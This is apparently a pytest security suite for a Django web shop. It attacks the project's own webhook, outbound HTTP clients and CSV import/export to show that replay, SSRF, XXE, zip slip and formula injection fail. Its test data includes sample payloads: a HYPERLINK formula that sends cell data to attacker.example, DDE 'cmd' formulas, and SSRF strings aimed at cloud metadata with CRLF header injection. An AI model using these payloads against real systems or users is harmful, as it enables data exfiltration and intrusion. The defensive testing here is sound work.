"""Attack scenarios, integrations (SEC.5, owner security wave item 10).

Each test plays the attacker against our own code and asserts that the attack fails and leaves
nothing behind. The suite lives under `integration/` because the root conftest files tests by
directory (ADR-0006) and the webhook cases need the database.

What is on main: one inbound webhook (email bounces and complaints, ARC.16, a signed JSON stub
until ARC.19), three outbound HTTP clients to fixed provider URLs (geocoder EVT.12, VIES TAX.5,
Turnstile CORE), and one CSV import and export (the shipping configuration, SHP.13). No code
parses XML, opens archives or reads XLSX yet; the guards below keep it that way until a task
brings a safe parser, and skipped placeholders name the task and the assertion to implement.

Cases already covered elsewhere are not repeated here:

- a forged webhook signature (another secret), a malformed body, GET: `apps/core/tests/
  integration/test_email_outbox.py::test_the_webhook_refuses_a_bad_signature_and_malformed_
  payloads`; the webhook off without a secret: `::test_the_webhook_is_off_without_a_secret`;
- the signature check itself (changed body, old timestamp, no headers): `apps/core/tests/unit/
  test_mail.py::test_signed_feedback_refuses_another_secret_a_changed_body_or_an_old_timestamp`;
- a repeated bounce suppresses once: `apps/core/tests/integration/test_email_outbox.py::
  test_feedback_dry_run_and_repeated_bounces_change_nothing_more` (service level; the replay
  through the endpoint is below);
- the geocoder transport encodes its parameters: `apps/core/tests/unit/test_geocoding_adapters.
  py::test_the_http_transport_sends_params_headers_and_timeout` (benign input; the hostile input
  is below);
- an oversized shipping CSV: `apps/shipping/tests/unit/test_config_format.py` (the
  `MAX_FILE_BYTES` cases).
"""

import ast
import contextlib
import json
import re
import secrets
import threading
import urllib.parse
import urllib.request
from collections.abc import Callable, Iterator, Mapping
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest
from django.test import Client, override_settings
from django.urls import reverse
from django.utils import timezone

from apps.accounts import captcha
from apps.core import mail, services
from apps.core.geocoding import AddressQuery, GeocoderUnavailable
from apps.core.geocoding import adapters as geo
from apps.core.models import AuditLog, EmailSuppression
from apps.shipping import config_format as fmt
from apps.tax import vies
from apps.tax.engine import ViesQuery

ROOT = Path(__file__).resolve().parents[3]
SOURCE_DIRS = ("apps", "mpmv")

# --- Webhook forgery and replay ---------------------------------------------------------------


@pytest.fixture
def webhook_secret() -> Iterator[str]:
    secret = secrets.token_urlsafe(32)
    with override_settings(EMAIL_WEBHOOK_SECRET=secret):
        yield secret


def _bounce(recipient: str = "victim@example.com") -> bytes:
    return json.dumps(
        {"events": [{"type": "hard_bounce", "recipient": recipient, "message_id": "m-1"}]}
    ).encode()


def _post(client: Client, body: bytes, headers: Mapping[str, str]) -> Any:
    return client.post(
        reverse("email_webhook"), data=body, content_type="application/json", headers=headers
    )


def _now() -> int:
    return int(timezone.now().timestamp())


def _nothing_recorded() -> bool:
    return not EmailSuppression.objects.exists() and not AuditLog.objects.exists()


@pytest.mark.parametrize("skew", [-301, 301, -86_400, 10**9], ids=["old", "future", "day", "far"])
@pytest.mark.django_db
def test_a_webhook_outside_the_timestamp_window_is_refused(
    client: Client, webhook_secret: str, skew: int
) -> None:
    """A correctly signed but stale (or post-dated) request: a captured request replayed later,
    or one signed ahead of time to be replayed in the future."""
    body = _bounce()
    headers = mail.SignedJsonFeedback(webhook_secret).sign(body, timestamp=_now() + skew)
    assert _post(client, body, headers).status_code == 403
    assert _nothing_recorded()


@pytest.mark.django_db
def test_a_signature_is_bound_to_its_timestamp(client: Client, webhook_secret: str) -> None:
    """Moving an old request's timestamp into the window, keeping its signature, fails."""
    body = _bounce()
    old = mail.SignedJsonFeedback(webhook_secret).sign(body, timestamp=_now() - 3_600)
    moved = {**old, mail.TIMESTAMP_HEADER: str(_now())}
    assert _post(client, body, moved).status_code == 403
    assert _nothing_recorded()


@pytest.mark.django_db
def test_a_signature_is_bound_to_its_body(client: Client, webhook_secret: str) -> None:
    """A signed bounce for one address, its body swapped for another victim's: refused."""
    signed = mail.SignedJsonFeedback(webhook_secret).sign(_bounce(), timestamp=_now())
    assert _post(client, _bounce("ceo@example.com"), signed).status_code == 403
    assert _nothing_recorded()


@pytest.mark.parametrize(
    "headers",
    [
        {},
        {mail.TIMESTAMP_HEADER: "now", mail.SIGNATURE_HEADER: "0" * 64},
        {mail.TIMESTAMP_HEADER: "-1", mail.SIGNATURE_HEADER: "0" * 64},
        {mail.TIMESTAMP_HEADER: "1e3", mail.SIGNATURE_HEADER: "0" * 64},
        {mail.TIMESTAMP_HEADER: "", mail.SIGNATURE_HEADER: ""},
    ],
    ids=["none", "word", "negative", "exponent", "empty"],
)
@pytest.mark.django_db
def test_missing_or_malformed_signature_headers_are_refused(
    client: Client, webhook_secret: str, headers: dict[str, str]
) -> None:
    assert _post(client, _bounce(), headers).status_code == 403
    assert _nothing_recorded()


@pytest.mark.django_db
def test_an_unsigned_webhook_secret_cannot_be_guessed_as_empty(client: Client) -> None:
    """With no secret configured the endpoint does not exist; an empty-key signature is no key."""
    with override_settings(EMAIL_WEBHOOK_SECRET=""):
        with pytest.raises(ValueError, match="secret is required"):
            mail.SignedJsonFeedback("")
        assert _post(client, _bounce(), {}).status_code == 404
    assert _nothing_recorded()


@pytest.mark.django_db
def test_a_replayed_webhook_inside_the_window_has_no_second_effect(
    client: Client, webhook_secret: str
) -> None:
    """The same signed request delivered twice (a provider retry or an attacker's replay
    within the 5 minutes): one suppression, one audit entry."""
    body = _bounce()
    headers = mail.SignedJsonFeedback(webhook_secret).sign(body, timestamp=_now())
    assert _post(client, body, headers).status_code == 204
    assert _post(client, body, headers).status_code == 204
    assert EmailSuppression.objects.filter(address="victim@example.com").count() == 1
    assert AuditLog.objects.filter(action="core.email.suppressed").count() == 1
    assert services.is_suppressed("victim@example.com")


@pytest.mark.skip(reason="needs ARC.19")
def test_the_provider_webhook_deduplicates_by_event_id() -> None:
    """To implement in ARC.19: the provider adapter verifies the provider's own signature
    scheme with its timestamp window, and records each provider event id once, so a replayed
    soft bounce does not add a second history event to the email."""


@pytest.mark.skip(reason="needs PAY.2")
def test_a_forged_or_replayed_payment_webhook_has_no_effect() -> None:
    """To implement in PAY.2 (its done-when): a Stripe event with a bad `Stripe-Signature`, a
    timestamp outside the tolerance, or a valid signature over another body is refused with no
    state change; the same event id delivered twice (and concurrently) runs
    `on_payment_succeeded` once; an event for an unknown PaymentIntent changes nothing."""


# --- SSRF in every outbound URL ---------------------------------------------------------------

# Every place that opens an outbound connection, and why its host cannot be chosen by a user.
OUTBOUND_CALL_SITES = {
    "apps/core/geocoding/adapters.py": "fixed provider URLs; the address only in the query",
    "apps/accounts/captcha.py": "the fixed Turnstile siteverify URL",
    "apps/tax/vies.py": "settings.VIES_API_URL; the VAT number only in the JSON body",
    "mpmv/healthcheck.py": "the container's own loopback health URL",
}
_OUTBOUND = re.compile(
    r"\burlopen\(|\bbuild_opener\(|\bimport (?:requests|httpx|urllib3|aiohttp)\b"
    r"|\bfrom (?:requests|httpx|urllib3|aiohttp)\b|\bHTTPS?Connection\(|\bcreate_connection\("
)


def _sources() -> Iterator[tuple[str, str]]:
    for top in SOURCE_DIRS:
        for path in sorted((ROOT / top).rglob("*.py")):
            relative = path.relative_to(ROOT).as_posix()
            if "/tests/" in relative or "/migrations/" in relative:
                continue
            yield relative, path.read_text(encoding="utf-8")


def test_every_outbound_http_call_site_is_reviewed_for_ssrf() -> None:
    """A new module that opens outbound connections fails this test until it is added to
    OUTBOUND_CALL_SITES with the reason its host is safe, or with the SSRF guard the
    placeholders below require for user-supplied URLs."""
    found = {relative for relative, text in _sources() if _OUTBOUND.search(text)}
    assert found == set(OUTBOUND_CALL_SITES)


HOSTILE_ADDRESS = AddressQuery(
    country="it&url=http://169.254.169.254/",
    postcode="@127.0.0.1:5432/",
    city="http://localhost/admin#",
    street="evil.example/?x=\r\nHost: 169.254.169.254",
)


@pytest.mark.parametrize(
    "adapter",
    [
        geo.NominatimGeocoder,
        geo.PhotonGeocoder,
        geo.LocationIQGeocoder,
        geo.OpenCageGeocoder,
    ],
)
def test_a_hostile_address_cannot_steer_the_geocoder(
    adapter: Callable[..., Any], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Whatever is typed in the address form, the request goes to the provider's host: the
    address only ever lands, URL-encoded, in the query string."""
    sent: list[urllib.request.Request] = []

    class Answer:
        def __enter__(self) -> "Answer":
            return self

        def __exit__(self, *args: object) -> None:
            return None

        def read(self) -> bytes:
            return b"[]"

    def fake_urlopen(request: urllib.request.Request, timeout: float) -> Answer:
        sent.append(request)
        return Answer()

    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    kwargs: dict[str, Any] = {"transport": geo.http_get_json}
    if adapter in (geo.LocationIQGeocoder, geo.OpenCageGeocoder):
        kwargs["key"] = secrets.token_urlsafe(16)
    else:
        kwargs["user_agent"] = "MPMV/test"
    geocoder = adapter(**kwargs)
    with contextlib.suppress(GeocoderUnavailable):  # "[]" is not every provider's shape
        geocoder.geocode(HOSTILE_ADDRESS, language="en")

    [request] = sent
    expected = urllib.parse.urlsplit(geocoder.url)
    actual = urllib.parse.urlsplit(request.full_url)
    assert (actual.scheme, actual.hostname, actual.port, actual.path) == (
        expected.scheme,
        expected.hostname,
        expected.port,
        expected.path,
    )
    assert actual.fragment == ""
    assert "\r" not in request.full_url
    assert "\n" not in request.full_url
    assert all(name.lower() != "host" for name in request.headers)


def test_a_hostile_vat_number_cannot_steer_the_vies_client() -> None:
    """The VAT number travels in the JSON body; the URL is the configured one."""
    calls: list[tuple[str, Mapping[str, Any]]] = []

    def transport(url: str, data: Mapping[str, Any], timeout: float) -> Mapping[str, Any]:
        calls.append((url, data))
        return {}

    client = vies.HttpViesClient(url="https://vies.example/check", transport=transport)
    client.check(ViesQuery(country="IT", prefix="IT", number="../../@169.254.169.254/x?y#"))
    [(url, body)] = calls
    assert url == "https://vies.example/check"
    assert body["vatNumber"] == "../../@169.254.169.254/x?y#"


class _Recorder(BaseHTTPRequestHandler):
    """A loopback HTTP server that records every request path it gets."""

    hits: list[str]
    redirect_to: str | None

    def _answer(self) -> None:
        self.hits.append(self.path)
        if self.redirect_to:
            self.send_response(302)
            self.send_header("Location", self.redirect_to)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = b"{}"
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = _answer
    do_POST = _answer

    def log_message(self, format: str, *args: Any) -> None:
        return None


def _serve(redirect_to: str | None) -> tuple[ThreadingHTTPServer, list[str]]:
    hits: list[str] = []
    handler = type("Handler", (_Recorder,), {"hits": hits, "redirect_to": redirect_to})
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, hits


TRANSPORTS: dict[str, Callable[[str], object]] = {
    "geocoder": lambda url: geo.http_get_json(url, {"q": "x"}, {}, 2.0),
    "vies": lambda url: vies.post_json(url, {"vatNumber": "1"}, 2.0),
    "captcha": lambda url: captcha._post_form(url, {"response": "x"}, 2.0),
}


@pytest.mark.xfail(
    strict=True,
    reason="Finding: the outbound transports follow redirects to any host (urllib default)",
)
@pytest.mark.parametrize("name", sorted(TRANSPORTS))
def test_an_outbound_transport_does_not_follow_a_redirect_to_another_host(name: str) -> None:
    """A provider answer (or a man in the middle on a misconfigured URL) redirecting to an
    internal address, such as the cloud metadata service, must not be followed. Two loopback
    servers stand in for the provider and the internal target, so no real network is used."""
    target, target_hits = _serve(None)
    provider, provider_hits = _serve(f"http://127.0.0.1:{target.server_port}/latest/meta-data/")
    try:
        with contextlib.suppress(Exception):  # refusing the redirect is the expected outcome
            TRANSPORTS[name](f"http://127.0.0.1:{provider.server_port}/api")
        assert provider_hits
        assert provider_hits[0].startswith("/api")
        assert target_hits == []
    finally:
        provider.shutdown()
        target.shutdown()


@pytest.mark.skip(reason="needs MIG.12")
def test_a_source_connector_refuses_internal_addresses() -> None:
    """To implement in MIG.12 (and MIG.14, ING.3): a shop URL entered by staff or a vendor is
    resolved through our resolver interface (mocked DNS in tests) and refused when any resolved
    address is loopback, private (RFC 1918, fc00::/7), link-local (169.254.0.0/16, fe80::/10),
    the cloud metadata address, multicast or unspecified; a redirect to such an address is
    refused too, and the connection goes to the address that was checked (no DNS rebinding)."""


@pytest.mark.skip(reason="needs ING.6")
def test_an_image_url_fetch_refuses_internal_addresses_and_redirects() -> None:
    """To implement in ING.6 (and ING.12 media URLs): the image fetcher applies the same
    resolved-address rule, follows at most a few redirects and checks each hop, accepts only
    http(s), caps the download size and refuses a non-image content type."""


@pytest.mark.skip(reason="needs ING.9")
def test_a_feed_url_refuses_internal_addresses() -> None:
    """To implement in ING.9: the publisher feed URL and any URL inside a feed (images,
    enclosures) go through the same SSRF guard as connectors."""


# --- XXE, zip slip and formula payloads in imports --------------------------------------------

_UNSAFE_XML_MODULES = ("xml.etree", "xml.dom", "xml.sax", "xml.parsers", "lxml", "xmltodict")


def _imported_modules(text: str) -> Iterator[str]:
    for node in ast.walk(ast.parse(text)):
        if isinstance(node, ast.Import):
            yield from (alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            yield node.module


def test_no_code_parses_xml_without_defusedxml() -> None:
    """XML parsers of the standard library and lxml resolve entities (XXE, billion laughs).
    Code that parses XML must use defusedxml; this fails as soon as anything else appears."""
    unsafe = sorted(
        f"{relative}: {module}"
        for relative, text in _sources()
        for module in _imported_modules(text)
        if module.startswith(_UNSAFE_XML_MODULES)
    )
    assert unsafe == []


def test_no_code_extracts_archives_without_a_path_check() -> None:
    """`extractall` and `extract` write wherever the member names point (`../../`, absolute
    paths, symlinks). No code may call them; an archive import must go through a helper that
    checks every member path first (placeholder below)."""
    calls = sorted(
        f"{relative}:{node.lineno}"
        for relative, text in _sources()
        for node in ast.walk(ast.parse(text))
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr in {"extractall", "extract", "unpack_archive"}
    )
    assert calls == []


@pytest.mark.skip(reason="needs ING.9")
def test_an_xml_feed_with_external_entities_is_refused() -> None:
    """To implement in ING.9: a publisher feed with a DOCTYPE declaring an external entity
    (`file:///etc/passwd`, `http://169.254.169.254/`) or an entity expansion bomb is refused
    with an import error, reads no file and opens no connection (defusedxml)."""


@pytest.mark.skip(reason="needs ING.6")
def test_an_archive_import_refuses_zip_slip() -> None:
    """To implement with the first archive import (ING.6 image packs, ING.9 feeds): members
    named `../evil.py`, `/etc/x`, `C:\\x` or a symlink out of the target are refused before
    anything is written; the total uncompressed size and the member count are capped (zip
    bomb)."""


@pytest.mark.skip(reason="needs ING.9")
def test_an_xlsx_import_stores_formulas_as_text_and_never_evaluates_them() -> None:
    """To implement in ING.9: an XLSX cell holding `=HYPERLINK(...)` or `=cmd|' /C calc'!A0` is
    read as its literal text (openpyxl with `data_only` off, no external links loaded), and
    re-exported escaped like the CSV export below."""


FORMULAS = [
    '=HYPERLINK("http://attacker.example/?"&A1,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
    "'=already quoted",
]


def _document_with(name: str) -> dict[str, Any]:
    return {
        "format": fmt.FORMAT,
        "version": fmt.VERSION,
        "country_groups": [],
        "zones": [
            {
                "code": "home",
                "name": name,
                "priority": 100,
                "countries": ["FR"],
                "country_groups": [],
                "postcode_patterns": [],
                "states": [],
            }
        ],
        "methods": [],
        "pickup_options": [{"key": "shop", "cost_net": "-1.50", "address": name}],
        "special_areas": [],
    }


def _cells(text: str) -> list[str]:
    import csv
    import io

    return [cell for row in csv.reader(io.StringIO(text)) for cell in row]


@pytest.mark.parametrize("payload", FORMULAS)
def test_the_shipping_csv_export_neutralises_formula_payloads(payload: str) -> None:
    """A zone name or pickup address set to a spreadsheet formula (by a vendor, or by an
    imported file) is exported as text: no cell of the CSV starts with a formula trigger."""
    exported = fmt.dump_csv(_document_with(payload))
    for cell in _cells(exported):
        assert not re.match(r"[=+\-@\t\r]", cell) or re.fullmatch(r"-?\d+(\.\d+)?", cell), cell


@pytest.mark.parametrize("payload", FORMULAS)
def test_a_formula_payload_round_trips_as_the_same_text(payload: str) -> None:
    """The escape is undone on import: exporting and importing gives back the exact text, and
    numbers such as a negative amount are not escaped."""
    exported = fmt.dump_csv(_document_with(payload))
    parsed = fmt.parse_csv(exported)
    assert parsed.ok, parsed.issues
    document = fmt.to_document(parsed)
    assert document["zones"][0]["name"] == payload
    assert document["pickup_options"][0]["address"] == payload
    assert document["pickup_options"][0]["cost_net"] == "-1.50"


@pytest.mark.skip(reason="needs CMP.23")
def test_order_and_tax_csv_exports_neutralise_formula_payloads() -> None:
    """To implement in CMP.23 (and CMP.4, CMP.12, TAX.10 exports): customer names, addresses,
    product titles and notes that start with `=`, `+`, `-`, `@`, tab or carriage return are
    written as text in every CSV and XLSX export, like the shipping export above."""
